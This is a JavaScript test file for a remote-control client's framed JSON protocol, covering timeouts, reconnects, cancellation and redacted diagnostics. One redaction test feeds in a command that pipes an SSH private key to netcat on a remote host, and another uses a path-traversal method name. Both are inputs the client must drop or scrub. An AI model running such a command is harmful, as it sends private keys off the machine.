import assert from "node:assert/strict";
import test from "node:test";
import { loadTsCommonJs } from "./helpers/loadTsCommonJs.mjs";

const { REMOTE_HELPER_MAX_FRAME_BYTES, REMOTE_HELPER_MAX_REQUEST_TIMEOUT_MS, REMOTE_HELPER_PROTOCOL_VERSION } = loadTsCommonJs("src/main/remote/RemoteHelperContract.ts");
const { REMOTE_FRAME_DIAGNOSTIC_CODES, createRemoteControlClient } = loadTsCommonJs("src/main/remote/RemoteControlClient.ts");

const HOST = "host-1";
const CODE_PATTERN = /^[A-Z][A-Z0-9_]{2,63}$/;
const ID_PATTERN = /^req-\d{1,18}$/;
/** Drop reasons the client raises on its own; named here so the tests never hard-code free strings. */
const DROP = REMOTE_FRAME_DIAGNOSTIC_CODES;

/** Production objects live in another VM realm, so deep comparisons are normalised through JSON. */
const plain = (value) => JSON.parse(JSON.stringify(value));

/** Deterministic clock + scheduler: deadlines are driven explicitly instead of waiting on the wall clock. */
function createClock() {
	let current = 1_700_000_000_000;
	const timers = new Set();
	return {
		now: () => current,
		scheduler: {
			setTimeout(handler, delayMs) {
				const timer = { at: current + Math.max(0, delayMs), handler };
				timers.add(timer);
				return timer;
			},
			clearTimeout(timer) {
				timers.delete(timer);
			},
		},
		advance(ms) {
			current += ms;
			for (;;) {
				const due = [...timers].filter((timer) => timer.at <= current).sort((first, second) => first.at - second.at);
				if (due.length === 0) return;
				for (const timer of due) {
					timers.delete(timer);
					timer.handler();
				}
			}
		},
		activeTimers: () => timers.size,
	};
}

/** Offline transport: `sent` collects the encoded lines, `setSend` swaps in a failing transport. */
function createHarness(options = {}) {
	const clock = options.clock ?? createClock();
	const sent = [];
	const diagnostics = [];
	let sendImpl = (line) => {
		sent.push(line);
	};
	const client = createRemoteControlClient({
		hostId: HOST,
		send: (line) => sendImpl(line),
		now: clock.now,
		scheduler: clock.scheduler,
		onDiagnostic: (entry) => {
			diagnostics.push(plain(entry));
		},
		...options.client,
	});
	return {
		client,
		clock,
		sent,
		diagnostics,
		frames: () => sent.map((line) => JSON.parse(line)),
		setSend: (next) => {
			sendImpl = next;
		},
	};
}

const okFrame = (id, generation, result = { echo: id }) => JSON.stringify({ v: REMOTE_HELPER_PROTOCOL_VERSION, hostId: HOST, generation, id, ok: true, result });
const errorFrame = (id, generation, error) => JSON.stringify({ v: REMOTE_HELPER_PROTOCOL_VERSION, hostId: HOST, generation, id, ok: false, error });
const lastFrame = (harness) => harness.frames().at(-1);
const codesOf = (harness) => harness.diagnostics.map((entry) => entry.code);

/** `await` on a rejecting cross-realm promise: the outcome is returned instead of thrown. */
async function rejection(promise) {
	let settled = "pending";
	let outcome;
	try {
		outcome = await promise;
		settled = "resolved";
	} catch (error) {
		settled = "rejected";
		outcome = error;
	}
	assert.equal(settled, "rejected", "expected the promise to reject");
	return outcome;
}

test("encodes one v1 frame line per request with a unique id", async () => {
	const harness = createHarness();
	const generation = harness.client.openConnection();
	assert.equal(generation, 1);
	assert.equal(harness.client.connectionGeneration, 1);
	assert.equal(harness.client.open, true);
	const first = harness.client.request("hello", { clientVersion: "0.x" });
	const second = harness.client.request("path.stat", { path: "." });
	assert.equal(harness.sent.length, 2);
	const [one, two] = harness.frames();
	assert.deepEqual(one, { v: REMOTE_HELPER_PROTOCOL_VERSION, hostId: HOST, generation: 1, id: one.id, method: "hello", timeoutMs: 30_000, params: { clientVersion: "0.x" } });
	assert.match(one.id, ID_PATTERN);
	assert.match(two.id, ID_PATTERN);
	assert.notEqual(one.id, two.id);
	assert.equal(two.method, "path.stat");
	assert.equal(
		harness.sent.every((line) => !line.includes("\n") && !line.includes("\r")),
		true,
		"the transport owns line termination",
	);
	assert.equal(harness.client.pendingCount(), 2);
	harness.client.handleLine(okFrame(one.id, 1, { first: true }));
	harness.client.handleLine(okFrame(two.id, 1, { second: true }));
	assert.deepEqual(plain(await first), { first: true });
	assert.deepEqual(plain(await second), { second: true });
	assert.equal(harness.client.pendingCount(), 0);
});

test("clamps the relative timeout to the contract bounds and falls back to the default", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const pending = [harness.client.request("hello", undefined, { timeoutMs: 99_999_999 }), harness.client.request("hello", undefined, { timeoutMs: 0 }), harness.client.request("hello", undefined, { timeoutMs: Number.NaN }), harness.client.request("hello", undefined, { timeoutMs: -5 })];
	const frames = harness.frames();
	assert.equal(frames[0].timeoutMs, REMOTE_HELPER_MAX_REQUEST_TIMEOUT_MS);
	for (const frame of frames.slice(1)) assert.equal(frame.timeoutMs, 30_000, "unusable timeouts fall back instead of disabling the deadline");
	assert.equal(Object.hasOwn(frames[1], "params"), false, "an omitted params field stays omitted");
	for (const frame of frames) harness.client.handleLine(okFrame(frame.id, 1));
	await Promise.all(pending);
	const custom = createHarness({ client: { defaultTimeoutMs: 1234 } });
	custom.client.openConnection();
	const one = custom.client.request("hello");
	assert.equal(lastFrame(custom).timeoutMs, 1234);
	custom.client.handleLine(okFrame(lastFrame(custom).id, 1));
	await one;
});

test("resolves with the helper result and ignores unknown forward-compatible fields", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("health");
	const id = lastFrame(harness).id;
	harness.client.handleLine(JSON.stringify({ v: REMOTE_HELPER_PROTOCOL_VERSION, hostId: HOST, generation: 1, id, ok: true, result: { status: "ok" }, futureField: { nested: true } }));
	assert.deepEqual(plain(await promise), { status: "ok" });
	assert.equal(harness.client.pendingCount(), 0);
	assert.deepEqual(harness.diagnostics, []);
});

test("settles concurrent requests independently", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const first = harness.client.request("file.readRange");
	const second = harness.client.request("git.status");
	const [one, two] = harness.frames();
	harness.client.handleLine(okFrame(two.id, 1, { second: true }));
	assert.deepEqual(plain(await second), { second: true });
	assert.equal(harness.client.pendingCount(), 1, "the other request is untouched");
	harness.client.handleLine(okFrame(one.id, 1, { first: true }));
	assert.deepEqual(plain(await first), { first: true });
	assert.equal(harness.client.pendingCount(), 0);
});

test("maps an ok:false body onto a structured error preserving code and retryable", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("file.writeAtomic", { path: "/home/u/project/secret.txt" });
	const id = lastFrame(harness).id;
	const remoteText = "failed to write /home/u/project/secret.txt (git filter=smudge)";
	harness.client.handleLine(errorFrame(id, 1, { code: "FILE_CONFLICT", message: remoteText, retryable: true }));
	const error = await rejection(promise);
	assert.equal(error.name, "RemoteControlError");
	assert.equal(error.code, "FILE_CONFLICT");
	assert.equal(error.retryable, true);
	assert.equal(error.message, "FILE_CONFLICT", "the thrown message is only the stable code");
	assert.equal(error.remoteMessage, remoteText, "the contract keeps the helper's own text for the caller");
	assert.deepEqual(harness.diagnostics, [], "a mapped error body is not a frame drop");
});

test("defaults retryable from the code when the helper omits it", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const transient = harness.client.request("git.fetch");
	const transientId = lastFrame(harness).id;
	harness.client.handleLine(errorFrame(transientId, 1, { code: "REQUEST_TIMEOUT" }));
	assert.equal((await rejection(transient)).retryable, true);
	const permanent = harness.client.request("path.list");
	const permanentId = lastFrame(harness).id;
	harness.client.handleLine(errorFrame(permanentId, 1, { code: "PATH_OUTSIDE_ROOT" }));
	const permanentError = await rejection(permanent);
	assert.equal(permanentError.code, "PATH_OUTSIDE_ROOT");
	assert.equal(permanentError.retryable, false);
	assert.equal(permanentError.remoteMessage, undefined, "an absent message stays absent");
	const overridden = harness.client.request("git.push");
	const overriddenId = lastFrame(harness).id;
	harness.client.handleLine(errorFrame(overriddenId, 1, { code: "PATH_OUTSIDE_ROOT", retryable: true }));
	assert.equal((await rejection(overridden)).retryable, true, "the helper's own flag wins");
});

test("refuses an error body whose code is free text", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("file.writeAtomic");
	const id = lastFrame(harness).id;
	harness.client.handleLine(errorFrame(id, 1, { code: "write failed: /home/u/.ssh/id_ed25519", message: "x" }));
	const error = await rejection(promise);
	assert.equal(error.code, "PROTOCOL_INVALID");
	assert.equal(error.message, "PROTOCOL_INVALID");
	assert.equal(JSON.stringify(error.remoteMessage ?? null).includes("/home/u"), false);
	assert.equal(harness.diagnostics.at(-1).code, DROP.invalid);
	assert.equal(harness.client.pendingCount(), 0, "an unusable error body must not leave the request hanging");
});

test("drops malformed frames without ever settling a live request", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("hello");
	const id = lastFrame(harness).id;
	const lines = [
		"{not json",
		"[]",
		"null",
		"{}",
		JSON.stringify({ v: 2, hostId: HOST, generation: 1, id, ok: true }),
		JSON.stringify({ v: 1, generation: 1, id, ok: true }),
		JSON.stringify({ v: 1, hostId: HOST, generation: 1, ok: true }),
		JSON.stringify({ v: 1, hostId: HOST, generation: 1, id: "not-an-id", ok: true }),
		JSON.stringify({ v: 1, hostId: HOST, generation: -1, id, ok: true }),
		JSON.stringify({ v: 1, hostId: HOST, generation: 1.5, id, ok: true }),
		JSON.stringify({ v: 1, hostId: HOST, generation: "1", id, ok: true }),
		JSON.stringify({ v: 1, hostId: HOST, generation: 1, id, ok: "yes" }),
		JSON.stringify({ v: 1, hostId: "", generation: 1, id, ok: true }),
	];
	for (const line of lines) harness.client.handleLine(line);
	assert.equal(harness.client.pendingCount(), 1);
	assert.equal(harness.diagnostics.length, lines.length);
	assert.equal(
		harness.diagnostics.every((entry) => entry.code === DROP.invalid),
		true,
	);
	harness.client.handleLine(okFrame(id, 1, { alive: true }));
	assert.deepEqual(plain(await promise), { alive: true });
});

test("drops lines with raw control characters or a NUL byte", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("hello");
	const id = lastFrame(harness).id;
	const line = okFrame(id, 1, { alive: true });
	harness.client.handleLine(`${line}\u0000`);
	harness.client.handleLine(`\u0001${line}`);
	harness.client.handleLine("");
	harness.client.handleLine("\n");
	harness.client.handleLine(`{"v":1,"hostId":"${HOST}\u0007"}`);
	assert.equal(harness.client.pendingCount(), 1);
	assert.equal(
		harness.diagnostics.every((entry) => entry.code === DROP.invalid),
		true,
	);
	harness.client.handleLine(`${line}\n`);
	assert.deepEqual(plain(await promise), { alive: true }, "exactly one transport terminator is tolerated");
});

test("drops a non-string line at the transport boundary", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("hello");
	const id = lastFrame(harness).id;
	for (const value of [null, undefined, 42, { v: 1 }, Buffer.from(okFrame(id, 1))]) harness.client.handleLine(value);
	assert.equal(harness.diagnostics.length, 5);
	assert.equal(
		harness.diagnostics.every((entry) => entry.code === DROP.invalid),
		true,
	);
	assert.equal(harness.client.pendingCount(), 1);
	harness.client.handleLine(okFrame(id, 1));
	await promise;
});

test("refuses an oversized inbound frame instead of truncating it", async () => {
	const harness = createHarness({ client: { maxFrameBytes: 256 } });
	harness.client.openConnection();
	const promise = harness.client.request("hello");
	const id = lastFrame(harness).id;
	const oversized = JSON.stringify({ v: REMOTE_HELPER_PROTOCOL_VERSION, hostId: HOST, generation: 1, id, ok: true, result: { padding: "x".repeat(400) } });
	assert.ok(Buffer.byteLength(oversized, "utf8") > 256);
	harness.client.handleLine(oversized);
	assert.equal(harness.diagnostics.at(-1).code, DROP.tooLarge);
	assert.equal(harness.client.pendingCount(), 1);
	harness.client.handleLine(okFrame(id, 1, { alive: true }));
	assert.deepEqual(plain(await promise), { alive: true });
});

test("refuses an oversized outbound frame instead of truncating it", async () => {
	const harness = createHarness({ client: { maxFrameBytes: 256 } });
	harness.client.openConnection();
	const error = await rejection(harness.client.request("file.writeAtomic", { body: "x".repeat(500) }));
	assert.equal(error.code, "PROTOCOL_INVALID");
	assert.equal(harness.sent.length, 0);
	assert.equal(harness.client.pendingCount(), 0);
	assert.equal(harness.clock.activeTimers(), 0);
	assert.equal(harness.diagnostics.at(-1).code, DROP.invalid);
});

test("keeps the contract frame limit as a ceiling and a sane floor for injected limits", async () => {
	const raised = createHarness({ client: { maxFrameBytes: 64 * 1024 * 1024 } });
	raised.client.openConnection();
	const error = await rejection(raised.client.request("file.writeAtomic", { body: "x".repeat(REMOTE_HELPER_MAX_FRAME_BYTES) }));
	assert.equal(error.code, "PROTOCOL_INVALID", "a caller cannot widen the protocol limit");
	const lowered = createHarness({ client: { maxFrameBytes: 1 } });
	lowered.client.openConnection();
	const promise = lowered.client.request("hello");
	assert.equal(lowered.sent.length, 1, "an unusable limit is floored, not obeyed literally");
	lowered.client.handleLine(okFrame(lastFrame(lowered).id, 1));
	await promise;
});

test("rejects params that cannot be encoded as one JSON frame", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const cyclic = {};
	cyclic.self = cyclic;
	assert.equal((await rejection(harness.client.request("hello", cyclic))).code, "PROTOCOL_INVALID");
	assert.equal((await rejection(harness.client.request("hello", { big: 1n }))).code, "PROTOCOL_INVALID");
	assert.equal(harness.sent.length, 0);
	assert.equal(harness.client.pendingCount(), 0);
});

test("rejects a method that cannot travel as a wire name", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	for (const method of ["", "hello world", "hello\nworld", "Hello", "hello/../etc/passwd", "x".repeat(200)]) {
		assert.equal((await rejection(harness.client.request(method))).code, "PROTOCOL_INVALID", method);
	}
	assert.equal(harness.sent.length, 0);
	assert.equal(harness.client.pendingCount(), 0);
});

test("fails closed when no connection is open", async () => {
	const harness = createHarness();
	const error = await rejection(harness.client.request("hello"));
	assert.equal(error.code, "REMOTE_CONNECTION_LOST");
	assert.equal(error.retryable, true);
	assert.equal(error.message, "REMOTE_CONNECTION_LOST");
	assert.equal(harness.sent.length, 0, "nothing is written without a generation");
	assert.equal(harness.diagnostics.at(-1).code, "REMOTE_CONNECTION_LOST");
	harness.client.openConnection();
	const pending = harness.client.request("hello");
	harness.client.closeConnection();
	await rejection(pending);
	assert.equal((await rejection(harness.client.request("hello"))).code, "REMOTE_CONNECTION_LOST", "a closed connection keeps failing closed");
	assert.equal(harness.client.open, false);
});

test("drops frames from a superseded generation and keeps the new one working", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const stale = harness.client.request("hello");
	const staleId = lastFrame(harness).id;
	assert.equal(harness.client.openConnection(), 2, "a second open is a reconnect");
	assert.equal((await rejection(stale)).code, "REMOTE_CONNECTION_LOST");
	assert.equal(harness.client.pendingCount(), 0);
	const live = harness.client.request("health");
	const liveId = lastFrame(harness).id;
	harness.client.handleLine(okFrame(staleId, 1, { stale: true }));
	harness.client.handleLine(okFrame(liveId, 1, { wrongGeneration: true }));
	harness.client.handleLine(errorFrame(liveId, 1, { code: "HELPER_INTERNAL" }));
	assert.equal(harness.client.pendingCount(), 1, "no old-generation frame may touch the live request");
	assert.equal(harness.diagnostics.filter((entry) => entry.code === DROP.staleGeneration).length, 3);
	harness.client.handleLine(okFrame(liveId, 2, { live: true }));
	assert.deepEqual(plain(await live), { live: true });
});

test("closeConnection fails every pending request once and never re-sends on a new generation", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const first = harness.client.request("session.list");
	const second = harness.client.request("git.status");
	const [one, two] = harness.frames();
	harness.client.closeConnection();
	assert.equal(harness.client.pendingCount(), 0);
	assert.equal(harness.client.open, false);
	assert.equal(harness.clock.activeTimers(), 0, "every deadline timer is cleared with its request");
	assert.equal((await rejection(first)).code, "REMOTE_CONNECTION_LOST");
	assert.equal((await rejection(second)).code, "REMOTE_CONNECTION_LOST");
	assert.equal(harness.diagnostics.filter((entry) => entry.code === "REMOTE_CONNECTION_LOST").length, 2);
	harness.clock.advance(600_000);
	assert.equal(harness.sent.length, 2, "a lost generation is never re-sent");
	assert.equal(harness.diagnostics.length, 2, "a cleared deadline cannot fire later");
	harness.client.openConnection();
	harness.client.handleLine(okFrame(one.id, 2, { resurrected: true }));
	harness.client.handleLine(errorFrame(two.id, 2, { code: "HELPER_INTERNAL" }));
	// A new generation starts with a fresh id history, so the old answers are unknown there - and either
	// way they must not settle or resurrect anything.
	assert.equal(harness.diagnostics.filter((entry) => entry.code === DROP.unknownId).length, 2);
	assert.equal(harness.client.pendingCount(), 0);
});

test("uses a caller-supplied stable close code and refuses free text as one", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const named = harness.client.request("hello");
	harness.client.closeConnection("REMOTE_HOST_OFFLINE");
	assert.equal((await rejection(named)).code, "REMOTE_HOST_OFFLINE");
	harness.client.openConnection();
	const unnamed = harness.client.request("hello");
	harness.client.closeConnection("ssh: connect to host 10.0.0.1 port 22 refused");
	const error = await rejection(unnamed);
	assert.equal(error.code, "REMOTE_CONNECTION_LOST");
	assert.equal(harness.diagnostics.at(-1).code, "REMOTE_CONNECTION_LOST");
	assert.equal(JSON.stringify(harness.diagnostics).includes("10.0.0.1"), false);
});

test("drops an unknown id and leaves live requests alone", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("hello");
	const id = lastFrame(harness).id;
	harness.client.handleLine(okFrame("req-999", 1));
	assert.equal(harness.diagnostics.at(-1).code, DROP.unknownId);
	assert.equal(harness.client.pendingCount(), 1);
	harness.client.handleLine(okFrame(id, 1, { alive: true }));
	assert.deepEqual(plain(await promise), { alive: true });
});

test("drops a frame addressed to another host", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("hello");
	const id = lastFrame(harness).id;
	harness.client.handleLine(JSON.stringify({ v: REMOTE_HELPER_PROTOCOL_VERSION, hostId: "host-2", generation: 1, id, ok: true, result: {} }));
	assert.equal(harness.diagnostics.at(-1).code, DROP.wrongHost);
	assert.equal(harness.client.pendingCount(), 1);
	harness.client.handleLine(okFrame(id, 1));
	await promise;
});

test("applies a duplicate terminal response exactly once", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const resolved = harness.client.request("health");
	const resolvedId = lastFrame(harness).id;
	harness.client.handleLine(okFrame(resolvedId, 1, { first: true }));
	assert.deepEqual(plain(await resolved), { first: true });
	harness.client.handleLine(okFrame(resolvedId, 1, { second: true }));
	assert.equal(harness.diagnostics.at(-1).code, DROP.duplicateResponse);
	const rejected = harness.client.request("git.status");
	const rejectedId = lastFrame(harness).id;
	harness.client.handleLine(errorFrame(rejectedId, 1, { code: "HELPER_INTERNAL" }));
	assert.equal((await rejection(rejected)).code, "HELPER_INTERNAL");
	harness.client.handleLine(okFrame(rejectedId, 1, { late: true }));
	assert.equal(harness.diagnostics.at(-1).code, DROP.duplicateResponse, "a late success must not revive a failed request");
	assert.equal((await rejection(rejected)).code, "HELPER_INTERNAL", "the first outcome stands");
	assert.equal(harness.client.pendingCount(), 0);
});

test("fails a request on its local deadline and ignores the late response", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("git.workspaceDiff", undefined, { timeoutMs: 50 });
	const id = lastFrame(harness).id;
	harness.clock.advance(49);
	assert.equal(harness.client.pendingCount(), 1, "the deadline is a real budget, not an immediate failure");
	harness.clock.advance(1);
	const error = await rejection(promise);
	assert.equal(error.code, "REQUEST_TIMEOUT");
	assert.equal(error.message, "REQUEST_TIMEOUT");
	assert.equal(error.retryable, true);
	assert.equal(harness.client.pendingCount(), 0);
	assert.equal(harness.clock.activeTimers(), 0);
	assert.equal(harness.diagnostics.at(-1).code, "REQUEST_TIMEOUT");
	harness.client.handleLine(okFrame(id, 1, { tooLate: true }));
	assert.equal(harness.diagnostics.at(-1).code, DROP.duplicateResponse, "a response may never influence a timed-out request");
	assert.equal(harness.client.pendingCount(), 0);
});

test("re-arms a scheduler that fires ahead of the clock, bounded and without sending", async () => {
	let scheduled = 0;
	const frozen = 1_700_000_000_000;
	const harness = createHarness({
		client: {
			now: () => frozen,
			scheduler: {
				setTimeout(handler) {
					scheduled += 1;
					handler();
					return scheduled;
				},
				clearTimeout() {},
			},
		},
	});
	harness.client.openConnection();
	const error = await rejection(harness.client.request("hello", undefined, { timeoutMs: 1000 }));
	assert.equal(error.code, "REQUEST_TIMEOUT");
	assert.ok(scheduled > 0 && scheduled <= 8, `bounded re-arms, saw ${scheduled}`);
	assert.equal(harness.sent.length, 0, "a request that already settled is never written to the transport");
	assert.equal(harness.client.pendingCount(), 0);
});

test("fails the request when the transport refuses the frame, without leaking transport text", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	harness.setSend(() => {
		throw new Error("ssh: connect to host 10.0.0.1 port 22: Permission denied (/home/u/.ssh/id_ed25519)");
	});
	const error = await rejection(harness.client.request("hello"));
	assert.equal(error.code, "REMOTE_CONNECTION_LOST");
	assert.equal(error.message, "REMOTE_CONNECTION_LOST");
	assert.equal(harness.client.pendingCount(), 0);
	assert.equal(harness.clock.activeTimers(), 0);
	assert.equal(harness.diagnostics.at(-1).code, DROP.sendFailed);
	assert.equal(JSON.stringify(harness.diagnostics).includes("10.0.0.1"), false);
});

test("fails the request when the transport rejects asynchronously", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	harness.setSend(() => Promise.reject(new Error("ssh: connect to host 10.0.0.2 refused")));
	const error = await rejection(harness.client.request("hello"));
	assert.equal(error.code, "REMOTE_CONNECTION_LOST");
	assert.equal(harness.client.pendingCount(), 0);
	assert.equal(harness.diagnostics.at(-1).code, DROP.sendFailed);
});

test("cancel aborts a pending request exactly once through its own id", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("git.fetch");
	const targetId = lastFrame(harness).id;
	const cancelling = harness.client.cancel(targetId);
	const cancelFrame = lastFrame(harness);
	assert.notEqual(cancelFrame.id, targetId);
	assert.equal(cancelFrame.method, "cancel");
	assert.deepEqual(cancelFrame.params, { requestId: targetId });
	assert.equal(harness.client.pendingCount(), 2, "cancel is a first-class request with its own entry");
	harness.client.handleLine(okFrame(cancelFrame.id, 1, { cancelled: true }));
	assert.deepEqual(plain(await cancelling), { cancelled: true });
	assert.equal((await rejection(target)).code, "REQUEST_CANCELLED");
	assert.equal(harness.client.pendingCount(), 0);
	harness.client.handleLine(errorFrame(targetId, 1, { code: "REQUEST_CANCELLED" }));
	assert.equal(harness.diagnostics.at(-1).code, DROP.duplicateResponse, "the helper's own abort frame arrives too late to matter");
	assert.equal((await rejection(target)).code, "REQUEST_CANCELLED");
});

test("cancel reports already-settled without sending a frame", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("git.status");
	const targetId = lastFrame(harness).id;
	harness.client.handleLine(okFrame(targetId, 1, { real: true }));
	assert.deepEqual(plain(await target), { real: true });
	const sentBefore = harness.sent.length;
	assert.deepEqual(plain(await harness.client.cancel(targetId)), { cancelled: false, reason: "already-settled" });
	assert.deepEqual(plain(await harness.client.cancel("req-4242")), { cancelled: false, reason: "already-settled" });
	assert.equal(harness.sent.length, sentBefore, "nothing left to abort means no frame");
	assert.equal((await rejection(harness.client.cancel("not-an-id"))).code, "PROTOCOL_INVALID");
});

test("fails a cancel closed when no connection is open", async () => {
	const harness = createHarness();
	assert.equal((await rejection(harness.client.cancel("req-1"))).code, "REMOTE_CONNECTION_LOST");
	assert.equal(harness.sent.length, 0);
});

test("a declined cancel keeps the real result instead of faking a rollback", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("session.replaceAtomic");
	const targetId = lastFrame(harness).id;
	const cancelling = harness.client.cancel(targetId);
	const cancelId = lastFrame(harness).id;
	harness.client.handleLine(okFrame(cancelId, 1, { cancelled: false, reason: "commit-started" }));
	assert.deepEqual(plain(await cancelling), { cancelled: false, reason: "commit-started" });
	assert.equal(harness.client.pendingCount(), 1, "the target is still in flight");
	harness.client.handleLine(okFrame(targetId, 1, { committed: true }));
	assert.deepEqual(plain(await target), { committed: true });
	assert.equal(harness.client.pendingCount(), 0);
});

test("cancel drops an undocumented refusal reason but keeps the refusal", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("git.fetch");
	const targetId = lastFrame(harness).id;
	const cancelling = harness.client.cancel(targetId);
	const cancelId = lastFrame(harness).id;
	harness.client.handleLine(okFrame(cancelId, 1, { cancelled: false, reason: "rollback finished: /home/u/x" }));
	assert.deepEqual(plain(await cancelling), { cancelled: false });
	harness.client.handleLine(okFrame(targetId, 1, { real: true }));
	assert.deepEqual(plain(await target), { real: true });
});

test("keeps a target that settled while the cancel was in flight", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("git.fetch");
	const targetId = lastFrame(harness).id;
	const cancelling = harness.client.cancel(targetId);
	const cancelId = lastFrame(harness).id;
	harness.client.handleLine(okFrame(targetId, 1, { real: true }));
	assert.deepEqual(plain(await target), { real: true });
	harness.client.handleLine(okFrame(cancelId, 1, { cancelled: true }));
	assert.deepEqual(plain(await cancelling), { cancelled: false, reason: "already-settled" }, "the delivered result stands, so no abort is claimed");
	assert.deepEqual(plain(await target), { real: true });
});

test("reports cancelled when the helper's own abort frame settled the target first", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("git.fetch");
	const targetId = lastFrame(harness).id;
	const cancelling = harness.client.cancel(targetId);
	const cancelId = lastFrame(harness).id;
	harness.client.handleLine(errorFrame(targetId, 1, { code: "REQUEST_CANCELLED" }));
	assert.equal((await rejection(target)).code, "REQUEST_CANCELLED");
	harness.client.handleLine(okFrame(cancelId, 1, { cancelled: true }));
	assert.deepEqual(plain(await cancelling), { cancelled: true }, "an abort that did happen is reported as one");
});

test("refuses to read an unreadable cancel result as an abort", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("git.fetch");
	const targetId = lastFrame(harness).id;
	const cancelling = harness.client.cancel(targetId);
	const cancelId = lastFrame(harness).id;
	harness.client.handleLine(okFrame(cancelId, 1, { cancelled: "yes" }));
	assert.equal((await rejection(cancelling)).code, "PROTOCOL_INVALID");
	assert.equal(harness.client.pendingCount(), 1, "the target is untouched by an unreadable answer");
	assert.equal(harness.diagnostics.at(-1).code, DROP.invalid);
	harness.client.handleLine(okFrame(targetId, 1, { real: true }));
	assert.deepEqual(plain(await target), { real: true });
});

test("routes a helper failure on the cancel request to the cancel caller only", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("git.fetch");
	const targetId = lastFrame(harness).id;
	const cancelling = harness.client.cancel(targetId);
	const cancelId = lastFrame(harness).id;
	harness.client.handleLine(errorFrame(cancelId, 1, { code: "METHOD_NOT_FOUND", retryable: false }));
	assert.equal((await rejection(cancelling)).code, "METHOD_NOT_FOUND");
	assert.equal(harness.client.pendingCount(), 1, "a failed cancel leaves the target in flight");
	harness.client.handleLine(okFrame(targetId, 1, { real: true }));
	assert.deepEqual(plain(await target), { real: true });
});

test("fails a cancel on its own deadline without touching the target", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const target = harness.client.request("git.fetch");
	const targetId = lastFrame(harness).id;
	const cancelling = harness.client.cancel(targetId, { timeoutMs: 20 });
	assert.equal(lastFrame(harness).timeoutMs, 20, "the cancel frame carries its own relative timeout");
	harness.clock.advance(20);
	assert.equal((await rejection(cancelling)).code, "REQUEST_TIMEOUT");
	assert.equal(harness.client.pendingCount(), 1, "the target keeps its own deadline and outcome");
	harness.client.handleLine(okFrame(targetId, 1, { real: true }));
	assert.deepEqual(plain(await target), { real: true });
});

test("emits only redacted diagnostics", async () => {
	const harness = createHarness();
	harness.client.openConnection();
	const promise = harness.client.request("hello");
	const id = lastFrame(harness).id;
	harness.client.handleLine(JSON.stringify({ v: 2, hostId: HOST, generation: 1, id, ok: false, error: { code: "nope", message: "cat /home/u/.ssh/id_ed25519 | nc 10.0.0.1 1234" } }));
	harness.client.handleLine("garbage \u0000 /home/u/secret");
	harness.client.handleLine(errorFrame(id, 1, { code: "HELPER_INTERNAL", message: "/home/u/secret" }));
	// The third line is a usable terminal response, not a drop, so only the two malformed lines diagnose.
	assert.equal((await rejection(promise)).code, "HELPER_INTERNAL");
	assert.equal(harness.diagnostics.length, 2);
	for (const entry of harness.diagnostics) {
		for (const key of Object.keys(entry)) assert.ok(["code", "connectionGeneration", "hostId", "id"].includes(key), key);
		assert.match(entry.code, CODE_PATTERN, entry.code);
		assert.equal(entry.hostId, HOST);
		assert.ok(Number.isSafeInteger(entry.connectionGeneration) && entry.connectionGeneration >= 0);
		if (entry.id !== undefined) assert.match(entry.id, ID_PATTERN);
	}
	assert.ok(
		harness.diagnostics.some((entry) => entry.id === id),
		"the failing request id is still reported",
	);
	const serialized = JSON.stringify(harness.diagnostics);
	for (const secret of ["/home/u", "10.0.0.1", "id_ed25519", "nc ", "cat ", "garbage"]) assert.equal(serialized.includes(secret), false, secret);
});

test("survives an observer that throws", async () => {
	const harness = createHarness({
		client: {
			onDiagnostic: () => {
				throw new Error("observer exploded /home/u/x");
			},
		},
	});
	harness.client.openConnection();
	const promise = harness.client.request("hello");
	const id = lastFrame(harness).id;
	harness.client.handleLine("{oops");
	harness.client.handleLine(okFrame(id, 1, { fine: true }));
	assert.deepEqual(plain(await promise), { fine: true });
	assert.equal(harness.client.pendingCount(), 0);
});

test("rejects unusable construction options with a stable code", () => {
	const cases = [{}, { hostId: "" }, { hostId: "host\u00001", send: () => {} }, { hostId: HOST }, { hostId: HOST, send: () => {}, onDiagnostic: "nope" }];
	for (const options of cases) {
		assert.throws(
			() => createRemoteControlClient(options),
			(error) => {
				assert.match(error.message, CODE_PATTERN, error.message);
				return true;
			},
		);
	}
});

test("keeps the outgoing frame size bounded by the transport's own limit", async () => {
	const harness = createHarness({ client: { maxFrameBytes: 512 } });
	harness.client.openConnection();
	const promise = harness.client.request("hello", { clientVersion: "0.x" });
	assert.ok(Buffer.byteLength(harness.sent[0], "utf8") <= 512);
	harness.client.handleLine(okFrame(lastFrame(harness).id, 1));
	await promise;
	assert.equal(harness.client.pendingCount(), 0);
});
